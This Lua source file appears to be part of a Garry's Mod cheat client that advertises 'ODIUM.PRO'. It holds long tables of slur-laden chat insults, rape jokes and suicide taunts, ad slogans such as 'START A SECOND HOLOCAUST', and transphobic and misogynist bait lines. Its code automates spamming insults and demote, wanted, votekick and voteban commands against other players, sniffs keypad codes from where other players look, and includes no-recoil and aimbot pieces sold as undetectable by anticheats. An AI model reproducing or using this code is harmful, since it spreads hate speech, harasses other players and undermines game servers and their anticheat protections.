
    "dose ur aim come in NOT NOOBE? LMAO",

    "lol i troled u so hard *OWNED*",

    "\"i lik 2 eat daddys logs of poo for lucnh while jackn off 2 naturo\"- u",

    "take a se4t faget $hitstain u got OWNDE",

    "LOL scrub ur gettin rekt hardcroe",

    "R u mad becouse ur bad nooby?",

    "LMAO did u go to da buthurt king an g3t urself a butthurt with fries?!?",

    "why dont u go and play manoppoly you noob",

    "you hav no lyfe you cant evan play gmod propaly",

    "im hi rite now on ganj but im stil ownen u xD",

    "if u want my cum bake ask ur mum LOL",

    "butdocter prognoses: OWND",

    "cry 2 ur dads dick forver noob",

    "lol troled autismal faget",

    "LOL N3RD owned",

    "\"i love to drink sprems all day\"- u",

    "crushd nerd do u want a baindaid for that LOL",

    "lol rectal rekage ur so sh1t lol",

    "ass states - [_] NOT REKT [X] REKT",

    "lmao do u even try????",

    "are u slippan off ur chaire cos ur ass is bleeding so hard??",

    "u better get a towel for all ur tears faget",

    "u got ass asassenated by me rofl",

    "u wont shit agen thats how rekt ur ass is",

    "i bet youre anus is sore from me ownen u LOL",

    "im gonna record a fragshow so i can watch me pwn u ova and ova LMAO",

    "i almost feel sorry for you hahahaha",

    "lol why dont u play COD so i can own you there too",

    "how dose it feel to be owneded so hartd??",

    "rekt u lol another one for the fraghsow",

    "if i was as bade as u i would kil myself",

    "dont fell bad not ervry one can be goode",

    "do u need some loob for ur butt so it doesnt hurt so much when i fuck u",

    "spesciall delivary for CAPTEN BUTTHURT",

    "wats wrong cant play wif ur dads dik in ur mouth????",

    "maybe if u put down the cheseburgers u could kill me lol fat nerd",

    "getting mad u virgan nerd??",

    "butt docta prognosis: buttfustrated",

    "<<< OWEND U >>>",

    "if u were a fish you wuld be a sperm whael LOL",

    ">mfw i ownd u",

    "rekt u noob *OWNED*",

    "ur gonna have 2 wear dipers now cos ur ass got SHREDED by me",

    "y dont u take a short strole to the fagot store and buy some skills scrub",

    "school3d by a 13yo lol u r rely bad",

    "ur pathetic nerd its like u have parkensons",

    "u just got promoted 2 cumcaptain prestige",

    "lol pwnd",

    "u just got butt raped lol TROLLED U",

    "did u learn 2 aim from stevie wondar??? LOL",

    "tell ur mum to hand the keyboard and mosue back",

    "how does it feel to be shit on by a 13 yer old",

    "r u into scat porns or some thing cos it feel\"s like u want me 2 shit on u",

    "u play gmod like my granpa and hes ded",

    "are u new or just bad?? noobe",

    "u play gmod lik a midget playin basket ball",

    "welcome to the noob scoole bus first stop ur house <<PWND>>",

    ">mfw i rek u",

    "\"i got my ass kiked so hard im shittn out my mouf\" - u",

    "<-(0.0)-<   dats u gettn ownd LOL",

    "u just got ur ass ablitterated <<<RECKT>>>",

    "c=3 (dats ur tiney dik rofl)",

    "just leeve the game and let the real mans play",

    "ur so bad u make ur noobe team look good",

    "CONGRASTULATIONS YOU GOT FRIST PRIZE IN BEING BUTT MAD (BUT LAST IN PENIS SIZE LMAO)",

    "im not even trying to pwn u its just so easy",

    "im only 13 an im better than u haha XD",

    "u just got raped",

    "some one an ambulance cos u just got DE_STROYED",

    "i hope u got birth control coz u got rapped",

    "lol pwnd scrubb",

    "you play lik a girl",

    "\"i got fukd so hard dat im cummin shit n shittn cum\"- u",

    "ur gonna need tampons for ur ass afta that ownage",

    "{{ scoooled u }}",

    "(O.o) ~c======3 dats me jizzan on u",

    "dont worry at least ur tryan XD",

    "cya noob send me a post card from pwnd city ROFL",

    "its ok if u keep practasing u will get bettar lol #rekt",

    "\"evry time i fart 1 liter of cum sqerts out\" - u",

    "rofl i pwnd u scrub #420 #based #mlgskill",

    "u fail just like ur dads condom",

    "if i pwnd u any harder it wud be animal abuse",

    "uploaden this fragshow roflmao",

}



local buyourshitfaggot = {

    "CAC + VAC + HAC + SAC UNDETECTED",

    "STEP UP YOUR GAME FAGGOT",

    "RUN ANY LUA SCRIPT UNDETECTED",

    "BE THE BEST WHEN YOU BUY THE BEST",

    "MAKE DARKRP KIDS CRY",

    "DEMOLISH THE LUA STATE",

    "PUT YOUR POWER ON DISPLAY",

    "STOMP NOOBS INTO THE DIRT",

    "CRASH SERVERS WITH NO SURVIVORS",

    "HACK ANYWHERE, ANYTIME, ANYONE",

    "DESTROY ALL ANTICHEATS",

    "TRIGGER FEMINISTS",

    "START A SECOND HOLOCAUST",

    "TIRED OF BEING A TOTAL FUCKING LOSER?",

    "STOMP THE COMP",

    "BLACK LIVES SPLATTERED",

    "MAKE FACEPUNCH FACEDUNKED",

    "BECOME UNBANNABLE",

    "DUNK SO HARD YOU BREAK THE NET",

    "#1 CAUSE OF ADMIN SUICIDES",

    "NO FAT CHICKS",

    "DO U <3 CHEATING?",

    "LEGIT IS FOR LOSERS",

    "YOUR LOSER PARENTS NEVER BOUGHT YOU TOYS THIS COOL",

    "SHOOT THE HOTTEST LOADS",

}



local thistriggersamericans = {

    "If i found out a girl I was flirting with was transgender I'd bash the fuck out of that degenerate cunt",

    "Feminism is a tool satan is using to corrupt and destroy gods country, FIGHT BACK!",

    "It's scientifically proven that women are physically and mentally weaker than men",

    "Man's job is to build empires and conquer the earth, woman's only job is to make more men",

    

}



local annoyingquestions = {

    "whats the max tabs you can have open on a vpn",

    "how many vpns does it take to stop a ddos",

    "whats better analog or garrys mod",

    "whats the time",

    "is it possible to make a clock in binary",

    "how many cars can you drive at once",

    "did you know there's more planes on the ground than there is submarines in the air",

    "how many busses can you fit on 1 bus",

    "how many tables does it take to support a chair",

    "how many doors does it take to screw a screw",

    "how long can you hold your eyes closed in bed",

    "how long can you hold your breath for under spagetti",

    "whats the fastest time to deliver the mail as mail man",

    "how many bees does it take to make a wasp make honey",

    "If I paint the sun blue will it turn blue",

    "how many beavers does it take to build a dam",

    "how much wood does it take to build a computer",

    "can i have ur credit card number",

    "is it possible to blink and jump at the same time",

    "did you know that dinosaurs were, on average, large",

    "how many thursdays does it take to paint an elephant purple",

    "if cars could talk how fast would they go",

    "did you know theres no oxygen in space",

    "do toilets flush the other way in australia",

    "if i finger paint will i get a splinter",

    "can you build me an ant farm",

    "did you know australia hosts 4 out of 6 of the deadliest spiders in the world",

    "is it possible to ride a bike in space",

    "can i make a movie based around your life",

    "how many pants can you put on while wearing pants",

    "if I paint a car red can it wear pants",

    "how come no matter what colour the liquid is the froth is always white",

    "can a hearse driver drive a corpse in the car pool lane",

    "how come the sun is cold at night",

    "why is it called a TV set when there is only one",

    "if i blend strawberries can i have ur number",

    "if I touch the moon will it be as hot as the sun",

    "did u know ur dad is always older than u",

    "did u know the burger king logo spells burger king",

    "did uknow if u chew on broken glass for a few mins, it starts to taste like blood",

    "did u know running is faster than walking",

    "did u kno the colur blue is called blue because its blue",

    "did you know a shooting star isnt a star",

    "did u know shooting stars dont actually have guns",

    "did u kno the great wall of china is in china",

    "statistictal fact: 100% of non smokers die",

    "did you kmow if you eat you poop it out",

    "did u know rain clouds r called rain clouds cus they are clouds that rain",

    "if cows drink milk is that cow a cannibal",

    "did u know you cant win a staring contest with a stuffed animal",

    "did u know if a race car is at peak speed and hits someone they'll die",

    "did u know the distance between the sun and earth is the same distance as the distance between the earth and the sun",

    "did u kno flat screen tvs arent flat",

    "did u know aeroplane mode on ur phone doesnt make ur phone fly",

    "did u kno too many britdhays can kill you",

    "did u know rock music isnt for rocks",

    "did u know if you eat enough ice you can stop global warming",

    "if ww2 happened before vietnam would that make vietnam world war 2",

    "did you know 3.14 isn't a real pie",

    "did u know 100% of stair accidents happen on stairs",

    "can vampires get AIDS",

    "what type of bird was a dodo",

    "did u know dog backwards is god",

    "did you know on average a dog barks more than a cat",

}



function AB.GenerateInsult()

    return table.Random(openers).." you "..table.Random(joiners).." "..table.Random(enders)

end



function AB.GenerateInsult2()

    return string.upper(table.Random(openers)).." YOU "..string.upper(table.Random(joiners)).." "..string.upper(table.Random(joiners)).." "..string.upper(table.Random(enders))

end



function AB.GenerateInsult3()

    return table.Random(adminstarts).." you "..table.Random(joiners).." "..table.Random(enders)

end



function AB.GenerateInsult4()

    return table.Random(cancerstrike)

end



function AB.GenerateInsult5()

    return table.Random(supercancerstrike)

end



function AB.GeneratePromo()

    return table.Random(buyourshitfaggot).." --> GET ODIUM.PRO"

end



function AB.FormatChatString( str )

    str = string.Replace( str, "@1", AB.GenerateInsult() )

    str = string.Replace( str, "@2", AB.GenerateInsult2() )

    str = string.Replace( str, "@3", AB.GenerateInsult3() )

    str = string.Replace( str, "@4", AB.GenerateInsult4() )

    str = string.Replace( str, "@opener", table.Random(openers) )

    str = string.Replace( str, "@joiner", table.Random(joiners) )

    str = string.Replace( str, "@slur", table.Random(enders) )

    str = string.Replace( str, "@getodium", AB.GeneratePromo() )

    str = string.Replace( str, "@csgo", AB.GenerateInsult5() )

    return str

end



concommand.Add("ace_insult", function() LocalPlayer():ConCommand("say "..AB.GenerateInsult()  ) end)

concommand.Add("ace_insult2", function() LocalPlayer():ConCommand("say "..AB.GenerateInsult2()  ) end)

local siterator = 1

concommand.Add("ace_insult3", function() LocalPlayer():ConCommand("say "..AB.GenerateInsult3() ) end)

concommand.Add("ace_insult4", function() LocalPlayer():ConCommand( "say "..AB.GenerateInsult4() ) end)



concommand.Add("ace_chatspam_once", function()

    local txt = AB.ChatSpamText

    if AB.Vars.ChatSpamOOC then txt = "// "..txt end

    txt = AB.FormatChatString( txt )

    if AB.Vars.ChatSpamPM then

        for _, p in pairs(player.GetAll()) do

            if !AB.Vars.ChatSpamPMAdmins and AB.GetRank( p ) != ( "user" or "guest" or "player" ) then continue end

            RunConsoleCommand("ulx", "psay", p:Nick(), txt)

        end

    else

        RunConsoleCommand("say", txt)

    end

end)







--AB.CurrentBase = 0

--AB.BaseAreaSize = 2000

function AB.SetBase()

    AB.ChatText( "Set base location", Color(255,255,255) )

    AB.CurrentBase = LocalPlayer():GetPos()

end

concommand.Add( "ace_base_set", AB.SetBase )



function AB.UnsetBase()

    AB.ChatText( "Removed base", Color(255,255,255) )

    AB.CurrentBase = 0

end

concommand.Add( "ace_base_remove", AB.UnsetBase )



function AB.SetBaseSize( p, cmd, arg, astr )

    if !tonumber( arg[1] ) then AB.ChatText( "Please specify a valid base radius in metres", Color(255,205,205) ) return end

    AB.ChatText( "Set base proximity radius to "..arg[1].."m", Color(255,255,255) )

    AB.BaseAreaSize = arg[1]

end

concommand.Add( "ace_base_setsize", AB.SetBaseSize )













local elements = {

    { -- Screen

        x = 0.075,

        y = 0.04,

        w = 0.85,

        h = 0.25,



    },

    { -- ABORT

        x = 0.075,

        y = 0.04 + 0.25 + 0.03,

        w = 0.85 / 2 - 0.04 / 2 + 0.05,

        h = 0.125,

        text = "ABORT",

    },

    { -- OK

        x = 0.5 + 0.04 / 2 + 0.05,

        y = 0.04 + 0.25 + 0.03,

        w = 0.85 / 2 - 0.04 / 2 - 0.05,

        h = 0.125,

        text = "OK",

    }

}



do -- Create numbers

    for i = 1, 9 do

        local column = (i - 1) % 3



        local row = math.floor((i - 1) / 3)

        

        local element = {

            x = 0.075 + (0.3 * column),

            y = 0.175 + 0.25 + 0.05 + ((0.5 / 3) * row),

            w = 0.25,

            h = 0.13,

            text = tostring(i),

        }

        table.insert(elements, element)

    end

end





function AB.CalculateKeypadCursorPos(ply, ent)

    if !ply:IsValid() then return end



    local tr = util.TraceLine( { start = ply:EyePos(), endpos = ply:EyePos() + ply:GetAimVector() * 65, filter = ply } )

    if !tr.Entity or tr.Entity ~= ent then return 0, 0 end



    local scale = ent.Scale

    if !scale then return 0, 0 end



    local pos, ang = ent:CalculateRenderPos(), ent:CalculateRenderAng()

    if !pos or !ang then return 0, 0 end

    local normal = ent:GetForward()

    

    local intersection = util.IntersectRayWithPlane(ply:EyePos(), ply:GetAimVector(), pos, normal)

    if !intersection then return 0, 0 end



    local diff = pos - intersection



    local x = diff:Dot( -ang:Forward() ) / scale

    local y = diff:Dot( -ang:Right() ) / scale



    return x, y

end



function AB.KPGetHoveredElement(ply, ent)

    local scale = ent.Scale



    local w, h = ent.Width2D, ent.Height2D

    local x, y = AB.CalculateKeypadCursorPos(ply, ent)



    for _, element in ipairs(elements) do

        local element_x = w * element.x

        local element_y = h * element.y

        local element_w = w * element.w

        local element_h = h * element.h



        if  element_x < x and element_x + element_w > x and

            element_y < y and element_y + element_h > y 

        then

            return element

        end

    end

end





















AB.ShekelGrabbers = {}

local nxsuicidemsg = 0

function AB.Logic()

local me = LocalPlayer()

if !me:IsValid() then return end



local lmemfootprint = gcinfo()



for k, v in pairs(player.GetAll()) do



-- spectator detector

    if( v:GetObserverTarget() and v != me and v:GetObserverTarget() == me and !table.HasValue( AB.TheyHaveEyesEverywhere, v ) ) then

        surface.PlaySound("buttons/bell1.wav")

        AB.ChatText( v:Nick().." has begun spectating you!", Color(255,100,0) )

        table.insert( AB.TheyHaveEyesEverywhere, v )

    end



    if AB.Vars.DodgeArrest then

    if v != me and v:EyePos():Distance( me:GetPos() ) < 120 and me:Alive() and ( v:GetActiveWeapon() and v:GetActiveWeapon():IsValid() and v:GetActiveWeapon():GetClass() == "arrest_stick" ) then

        if nxsuicidemsg <= CurTime() then

            AB.ChatText( "Automatically suicided to avoid being arrested by "..v:Nick(), Color(255,255,255) )

            nxsuicidemsg = CurTime() + 1

        end

        RunConsoleCommand( "kill" )

    end

    end





    if AB.Vars.KeypadJew then



    local kp = v:GetEyeTrace().Entity

    if IsValid(kp) && IsValid(v) and string.find( kp:GetClass(), "Keypad") and v:EyePos():Distance(kp:GetPos()) <= 120 then

        kp.tempCode = kp.tempCode or ""

        kp.tempText = kp.tempText or ""

        kp.tempStatus = kp.tempStatus or 0

            

        if kp:GetText() != kp.tempText or kp:GetStatus() != kp.tempStatus then

            kp.tempText = kp:GetText()

            kp.tempStatus = kp:GetStatus()

            if(kp.tempText && !kp:GetSecure()) then

                kp.tempCode = kp.tempText

                timer.Simple(0, function() 

                    if kp:GetStatus() == 1 && kp.tempCode && kp.tempCode != "" then

                        kp.code = kp.tempCode

                    end

                end)

            else

                local i = AB.KPGetHoveredElement(v, kp)

                if (i) then i = i.text end

                if kp.tempText then

                    timer.Simple(0, function()

                        if kp:GetStatus() == 1 && kp.tempCode && kp.tempCode != "" then

                            kp.code = kp.tempCode

                        end

                    end)

                end

                

                if kp.tempText == "" || kp:GetStatus() == 2 then

                    kp.tempCode = ""

                end

                    

                timer.Simple(0, function() 

                    if(tonumber(i) && kp:GetText():len() != 0) then

                        kp.tempCode = kp.tempCode..i

                    end

                end)

            end

        end

    end



    end







    if isvector( AB.CurrentBase ) then

        if v == me then continue end

        if AB.ToMetric( v:GetPos():Distance( AB.CurrentBase ) ) < tonumber(AB.BaseAreaSize) then

            if !table.HasValue( AB.ShekelGrabbers, v ) then

                surface.PlaySound("buttons/bell1.wav")

                AB.ChatText( v:Nick().." has entered your base!", Color(255,205,0) )

                table.insert( AB.ShekelGrabbers, v )

            end

        elseif table.HasValue( AB.ShekelGrabbers, v ) and AB.ToMetric( v:GetPos():Distance( AB.CurrentBase ) ) > tonumber(AB.BaseAreaSize) then

            AB.ChatText( v:Nick().." has left your base", Color(100,255,100) )

            table.RemoveByValue( AB.ShekelGrabbers, v )

        end

    else

        AB.ShekelGrabbers = {}

    end



end



for k,v in pairs( AB.TheyHaveEyesEverywhere ) do

    if( !IsValid( v ) ) then table.remove( AB.TheyHaveEyesEverywhere, k ) continue end

    if( !v:GetObserverTarget() or ( v:GetObserverTarget() and v:GetObserverTarget() != me ) ) then

        AB.ChatText( v:Nick().." has stopped spectating you!", Color(100,255,100) )

        table.remove( AB.TheyHaveEyesEverywhere, k )

    end

end



if AB.Vars.ChatSpam then

    if AB.Vars.ChatSpamBind and !me:KeyDown(IN_WALK) then return end

    local txt = AB.ChatSpamText

    if AB.Vars.ChatSpamInsult then txt = AB.GenerateInsult() end

    if AB.Vars.ChatSpamOOC then txt = "// "..txt end

    txt = AB.FormatChatString( txt )

    if AB.Vars.ChatSpamPM then

        for _, p in pairs(player.GetAll()) do

            if !AB.Vars.ChatSpamPMAdmins and AB.GetRank( p ) != ( "user" or "guest" or "player" ) then continue end

            RunConsoleCommand("ulx", "psay", p:Nick(), txt)

        end

    else

        RunConsoleCommand("say", txt)

    end

end



if AB.Vars.DemoteSpam or AB.Vars.WantedSpam or AB.Vars.ULXVotekickSpam or AB.Vars.ULXVotebanSpam then

    for k, v in RandomPairs(player.GetAll()) do

        if AB.IsFriend( v ) or v == me then continue end

        local fag1, fag2 = table.Random( demotereasons )

        if AB.Vars.DemoteSpam then RunConsoleCommand( "darkrp", "demote", v:Nick(), fag1 ) end

        if AB.Vars.WantedSpam then RunConsoleCommand( "darkrp", "wanted", v:Nick(), fag1 ) end

        if AB.Vars.ULXVotekickSpam then RunConsoleCommand( "ulx", "votekick", v:Nick(), fag1 ) end

        if AB.Vars.ULXVotebanSpam then RunConsoleCommand( "ulx", "voteban", v:Nick(), "0" ) end

    end

end



if AB.Vars.FlashlightSpam then

    if input.IsKeyDown(KEY_F) then me:ConCommand("impulse 100") end

end



if AB.IsTTT then AB.ScanForTraitors() end



AB.MemoryDebug["logic"] = gcinfo() - lmemfootprint



end

hook.Add("Think", "ab_logic", AB.Logic)







function AB.PKTube()

local oldwep = false

if !LocalPlayer():IsOnGround() then AB.ChatText( "You can't tube launch when you aren't on the ground!", Color(255,100,0) ) return end

if !LocalPlayer():HasWeapon("weapon_physgun") then AB.ChatText( "You don't have a physgun!", Color(255,100,0) ) return end

if LocalPlayer():GetActiveWeapon():GetClass() != "weapon_physgun" then RunConsoleCommand( "use", "weapon_physgun" ) oldwep = true end



AB.EyeAngles( LocalPlayer():EyeAngles() - Angle(-180,0,0) )

AB.ActionTimer( 0.05, function() RunConsoleCommand( "gm_spawn", "models/props_phx/construct/concrete_pipe01.mdl") end)

AB.ActionTimer( 0.05, function() AB.EyeAngles( LocalPlayer():EyeAngles() - Angle(120,0,0) ) end)

AB.ActionTimer( 0.1, function() RunConsoleCommand( "+attack") end)

AB.ActionTimer( 0.05, function() AB.ScrollDelta = 100 end)

AB.ActionTimer( 0.1, function() RunConsoleCommand( "-attack") AB.ScrollDelta = 0 end)

if oldwep then

AB.ActionTimer( 0.01, function() RunConsoleCommand( "lastinv") end)

end

AB.ActionTimer( 0.1, function() RunConsoleCommand( "undo") end, true)



end

concommand.Add("ace_pk_tubelaunch", AB.PKTube)



function AB.PK180()

AB.EyeAngles( Angle(LocalPlayer():EyeAngles().p, LocalPlayer():EyeAngles().y - 180, LocalPlayer():EyeAngles().r) )

end

concommand.Add("ace_pk_180", AB.PK180)



function AB.PK180Up()

--AB.EyeAngles( Angle(LocalPlayer():EyeAngles().p, LocalPlayer():EyeAngles().y - 180, LocalPlayer():EyeAngles().r) )

AB.EyeAngles( Angle( -LocalPlayer():EyeAngles().p, LocalPlayer():EyeAngles().y - 180, LocalPlayer():EyeAngles().r) )

RunConsoleCommand( "+jump")

timer.Simple(0.1, function() RunConsoleCommand( "-jump") end)

end

concommand.Add("ace_pk_180up", AB.PK180Up)



function AB.ClimbSwep()

local oldang = LocalPlayer():EyeAngles()

AB.EyeAngles( Angle( -LocalPlayer():EyeAngles().p, LocalPlayer():EyeAngles().y - 90, LocalPlayer():EyeAngles().r) )

timer.Simple(0.15, function() AB.EyeAngles( oldang ) end)

end

concommand.Add("ace_climbswep", AB.ClimbSwep)



function AB.EyeAngles( ang )

    local ang = Angle(math.Clamp(ang.p, -90, 90), ang.y, ang.r)

    ang:Normalize()

    LocalPlayer():SetEyeAngles(ang)

end



local actiontime = 0



function AB.ActionTimer( delay, func, terminate )

terminate = terminate or false

actiontime = actiontime + delay + (LocalPlayer():Ping() / 1000)

timer.Simple( actiontime, func)

if terminate then actiontime = 0 end

end







function AB.CanSee( ply )

local Trace = util.TraceLine( { 

start = LocalPlayer():GetShootPos(), 

endpos = AB.FindTargetPosition( ply ), 

mask = MASK_SHOT, 

filter = { LocalPlayer(), ply }

} )



return !Trace.Hit

end





------------------------------------------------------------------------PROPKILL UTILS--------------------------------------------------------------------------------------



function AB.PhysgunPickup( p, e )

    if AB.Vars.DontTouchMeThere and e == LocalPlayer() then RunConsoleCommand( "kill" ) end

    AB.HoldingProp = e

end



function AB.PhysgunDrop( p, e )

--    AB.HoldingProp = game.GetWorld()

end



hook.Add( "PhysgunPickup", "ab_physgun", AB.PhysgunPickup )

hook.Add( "PhysgunDrop", "ab_physgun", AB.PhysgunDrop )





------------------------------------------------------------------------WEAPON INSPECTOR--------------------------------------------------------------------------------------

















local function gaytext( parent, text, vpos, color )

local ABLabel = vgui.Create( "DLabel", parent )

ABLabel:SetFont( "TargetID" )

ABLabel:SetPos( 20, vpos)

ABLabel:SetColor( color )

ABLabel:SetText( text )

ABLabel:SizeToContents()

end



local overrides = {



    ["weapon_crowbar"] = {

        Damage = 25,

        NumShots = 1,

        ClipSize = 1,

        Delay = 0.404

    },



    ["weapon_stunstick"] = {

        Damage = 40,

        NumShots = 1,

        ClipSize = 1,

        Delay = 0.81

    },



    ["weapon_pistol"] = {

        Damage = 12,

        NumShots = 1,

        ClipSize = 18,

        Ammo = "pistol",

        Delay = 0.12,

    },



    ["weapon_357"] = {

        Damage = 75,

        NumShots = 1,

        ClipSize = 6,

        Ammo = "357",

        Delay = 0.75,

    },



    ["weapon_smg1"] = {

        Damage = 12,

        NumShots = 1,

        ClipSize = 45,

        Ammo = "SMG1",

        Delay = 0.075,

    },



    ["weapon_shotgun"] = {

        Damage = 4,

        NumShots = 7,

        ClipSize = 6,

        Ammo = "buckshot",

        Delay = 0.9,

    },



    ["weapon_ar2"] = {

        Damage = 11,

        NumShots = 1,

        ClipSize = 30,

        Delay = 0.105,

    },



    ["weapon_crossbow"] = {

        Damage = 100,

        NumShots = 1,

        ClipSize = 1,

        Delay = 1.95,

    },



    ["weapon_rpg"] = {

        Damage = 150,

        NumShots = 1,

        ClipSize = 1,

        Delay = 2.2,

    },



    ["weapon_frag"] = {

        Damage = 150,

        NumShots = 1,

        ClipSize = 1,

        Delay = 1.95,

    },



    ["fas2_rem870"] = {

        Delay = .86,

    },



    ["fas2_ks23"] = {

        Delay = 1.11,

    },



    ["fas2_m67"] = {

        Damage = 160,

        Delay = 1.75,

    },



}



local ammostrings = {

    pistol = "HL2 Pistol",

    smg1 = "HL2 SMG",

    ar2 = "HL2 Pulse Rifle",

    ["357"] = "HL2 Magnum",

    buckshot = "HL2 Shotgun",

    rpg_round = "HL2 Rocket",

}



function AB.GunMenu()

if GMenu then return end



local GMenu = vgui.Create("DFrame")

GMenu:SetSize(590,520)

GMenu:SetTitle("Inspecting Weapon")

GMenu:Center()

GMenu:MakePopup()



GMenu.Paint = function(panel, w, h)

surface.SetDrawColor( Color(50, 50, 90, 255) )

surface.DrawRect( 0, 0, w, h )

surface.SetDrawColor( Color(155, 155, 155, 255) )

surface.DrawOutlinedRect( 0, 0, w, h )

surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )

surface.SetDrawColor( Color(0, 0, 0, 255) )

surface.DrawRect( 10, 25, w - 20, h - 35 )

end



local gun = LocalPlayer():GetActiveWeapon()

if !gun:IsValid() then return end

local m9gay = false

local fas = false

local cw2 = false

if gun.Base == "bobs_gun_base" or gun.Base == "bobs_shotty_base" or gun.Base == "bobs_scoped_base" then m9gay = true end

if gun.Base == "fas2_base" or gun.Base == "fas2_base_shotgun" then fas = true end

if gun.Base == "cw_base" then cw2 = true end



gaytext( GMenu, "Weapon Name: "..gun:GetPrintName(), 30, Color(205,225,255,255) )

gaytext( GMenu, "Weapon Class: "..gun:GetClass(), 50, Color(105,225,255,255) )



//////////////////////////////// hl2 guns ////////////////////////////////



if !gun.Primary then gun.Primary = {} end



if overrides[gun:GetClass()] then

local tab = overrides[gun:GetClass()]

for k, v in pairs(tab) do

    gun.Primary[k] = v

end



end



//////////////////////////////// weapon stat workarounds ////////////////////////////////



local delay = 0

if gun.Primary.Delay then

    delay = gun.Primary.Delay

elseif m9gay then

    delay = 60 / gun.Primary.RPM

elseif fas or cw2 then

    delay = gun.FireDelay

end



local gdmg = 0

if gun.Primary.Damage then

    gdmg = gun.Primary.Damage

elseif fas or cw2 then

    gdmg = gun.Damage

end



local gnumshots = 1

if gun.Primary.NumShots then

    gnumshots = gun.Primary.NumShots

elseif fas or cw2 then

    gnumshots = gun.Shots or 1

end



local gcone = 0

if gun.Primary.Cone then

    gcone = gun.Primary.Cone

elseif m9gay then

    gcone = gun.Primary.Spread

elseif fas then

    gcone = gun.HipCone or 0

elseif cw2 then

    gcone = gun.HipSpread or 0

end



local grecoil = 0

if gun.Primary.Recoil then

    grecoil = gun.Primary.Recoil

elseif m9gay then

    grecoil = gun.Primary.KickUp

elseif fas then

    grecoil = gun.Recoil or 0

end



local voff = 90



gaytext( GMenu, "Damage: "..(gdmg or "nil").." ( x"..(gnumshots or "nil").." ) -- ("..(gdmg * gnumshots).." Total)", voff, Color(255,225,155,255) )

voff = voff + 20





if gun.Primary.ClipSize then

    if gun.Primary.ClipSize == -1 then gun.Primary.ClipSize = 1 end

    gaytext( GMenu, "Damage Per Mag: "..(gdmg * gnumshots) * gun.Primary.ClipSize, voff, Color(255,205,105,255) )

    voff = voff + 20

end



gaytext( GMenu, "Damage Per Second: "..math.ceil(1 / delay * (gdmg * gnumshots)), voff, Color(255,155,85,255) )

voff = voff + 20



if gun.Primary.ClipSize then

gaytext( GMenu, "Magazine: "..(gun.Primary.ClipSize or "No Magazine"), voff, Color(255,195,195,255) )

voff = voff + 20



gaytext( GMenu, "Magdump Time: "..math.Round(gun.Primary.ClipSize * delay, 3).."s", voff, Color(255,95,155,255) )

voff = voff + 20

end



gaytext( GMenu, "Accuracy: "..(10 - (gcone * 100) ), voff, Color(255,255,155,255) )

voff = voff + 20



if fas then

gaytext( GMenu, "Accuracy (Aiming): "..(10 - (gun.AimCone or 0 * 100) ), voff, Color(155,255,155,255) )

voff = voff + 20    

end

if cw2 then

gaytext( GMenu, "Accuracy (Aiming): "..(10 - (gun.AimSpread or 0 * 100) ), voff, Color(155,255,155,255) )

voff = voff + 20    

end





gaytext( GMenu, "Fire Rate: "..math.Round(delay, 3).." ( "..math.ceil(60 / delay).." Rounds Per Min )", voff, Color(255,255,155,255) ) 

voff = voff + 20



--gaytext( GMenu, "Recoil: "..grecoil.." ( "..math.Round((grecoil * 10) * 1 / delay, 1).." recoil per second ) ", voff, Color(205,255,125,255) )

--voff = voff + 20





if gun.Primary.Ammo then

    local ammotyperaw = gun.Primary.Ammo

    local ammotype = string.lower(gun.Primary.Ammo)

    if ammostrings[ammotype] then ammotyperaw = ammostrings[ammotype] end

    gaytext( GMenu, "Ammo Type: "..ammotyperaw, voff, Color(105,255,125,255) ) 

    voff = voff + 20

end



if m9gay then gaytext( GMenu, "Damage and TTK stats inaccurate due to m9k double penetration bug", voff, Color(255,0,0,255) ) end

voff = voff + 40



gaytext( GMenu, "Shots to Kill: "..math.ceil(50 / (gdmg * gnumshots) ).."x headshots -- "..math.ceil(100 / (gdmg * gnumshots)).."x torso shots -- "..math.ceil(400 / (gdmg * gnumshots)).."x limb shots", voff, Color(255,125,155,255) )

voff = voff + 20

gaytext( GMenu, "Shots to Kill (Armor): "..math.ceil(100 / (gdmg * gnumshots) ).."x headshots -- "..math.ceil(200 / (gdmg * gnumshots)).."x torso shots -- "..math.ceil(800 / (gdmg * gnumshots)).."x limb shots", voff, Color(255,125,255,255) )

voff = voff + 40



local ttk = (delay * math.ceil(100 / (gdmg * gnumshots) )) - delay

local ttk2 = (delay * math.ceil(50 / (gdmg * gnumshots) )) - delay

local ttk3 = (delay * math.ceil(400 / (gdmg * gnumshots) )) - delay

local ttk4 = (delay * math.ceil(200 / (gdmg * gnumshots) )) - delay

local ttk5 = (delay * math.ceil(800 / (gdmg * gnumshots) )) - delay

gaytext( GMenu, "Time to Kill: "..math.Round(ttk2, 3).."s (Head) -- "..math.Round(ttk, 3).."s (Body) -- "..math.Round(ttk3, 3).."s (Limb)", voff, Color(205,255,185,255) )

voff = voff + 20

gaytext( GMenu, "Time to Kill (Armored): "..math.Round(ttk, 3).."s (Head) -- "..math.Round(ttk4, 3).."s (Body) -- "..math.Round(ttk5, 3).."s (Limb)", voff, Color(155,155,255,255) )

voff = voff + 20







end

concommand.Add("ace_inspectweapon", AB.GunMenu)











------------------------------------------------------------------------AIMBOT UTIL FUNCTIONS--------------------------------------------------------------------------------------







-- get this from a better place fucknuts

local OEyeAngles = OEyeAngles or FindMetaTable( "Player" ).SetEyeAngles

FindMetaTable( "Player" ).SetEyeAngles = function( self, angle )

    if ( string.find( string.lower( debug.getinfo( 2 ).short_src ), "/weapons/" ) ) and AB.Vars.NoRecoil then return end

    OEyeAngles( self, angle )

end



local shitweapons = {

    "weapon_physgun",

    "weapon_physcannon",

    "weapon_bugbait",

    "weapon_fists",

    "gmod_camera",

    "gmod_tool",

    "weapon_medkit",

    "weapon_zm_carry",

    "weapon_ttt_unarmed",

}

-- make sure its a non spastic weapon to aimbot/triggerbot with

function AB.CanBotShoot( wep )

if !wep:IsValid() then return end

if table.HasValue( shitweapons, wep:GetClass() ) then return false end

return true

end



function AB.GetView()

    return AB.ViewAngle * 1

end



function AB.FixView()

    if !AB.Vars.Aimbot then return end



    local ply = LocalPlayer()

    if !ply:IsValid() then return end



    AB.ViewAngle = ply:EyeAngles()

end



local sensitivity = 0.022

function AB.RotateView(cmd)

    AB.ViewAngle.p = math.Clamp(AB.ViewAngle.p + (cmd:GetMouseY() * sensitivity), -89, 89)

    AB.ViewAngle.y = math.NormalizeAngle(AB.ViewAngle.y + (cmd:GetMouseX() * sensitivity * -1))

end



-- fov based targeting shit

function AB.GetAngleFromCrosshair( ply )

        local Ang = (AB.FindTargetPosition( ply ) - LocalPlayer():EyePos() ):Angle()

        local myangles = LocalPlayer():EyeAngles()

